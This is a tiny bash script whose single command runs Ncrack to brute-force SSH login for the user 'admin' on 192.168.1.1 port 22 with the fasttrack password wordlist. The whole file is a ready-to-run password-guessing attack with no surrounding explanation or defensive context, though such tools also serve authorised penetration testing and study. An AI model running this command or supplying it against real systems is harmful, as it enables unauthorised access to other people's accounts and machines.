#!/usr/bin/env bash

#use Ncrack to brute force ssh protocol
ncrack -v --user admin -P /usr/share/wordlists/fasttrack.txt -m ssh 192.168.1.1:22

